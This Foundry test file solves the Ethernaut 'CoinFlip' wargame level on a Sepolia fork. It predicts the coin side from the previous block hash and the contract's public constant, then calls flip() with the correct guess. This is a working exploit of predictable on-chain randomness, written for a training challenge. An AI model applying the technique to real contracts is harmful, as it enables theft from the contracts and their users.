// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "openzeppelin-contracts/utils/math/SafeMath.sol";
import "../../src/levels/03-CoinFlip/CoinFlip.sol"; // test/Billy/ folder

contract ContractTest4 is Test {
    using SafeMath for uint256;
    CoinFlip level3 =
        CoinFlip(payable(0x8658FC75c895A196E8054f415527bc34455f3d97));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x8658FC75c895A196E8054f415527bc34455f3d97),
            "Ethernaut03"
        );
    }

    function testEthernaut03() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue.div(FACTOR);

        bool side = coinFlip == 1 ? true : false;

        level3.flip(side);

        console.log("Consecutive Wins: ", level3.consecutiveWins());
    }

    receive() external payable {}
}
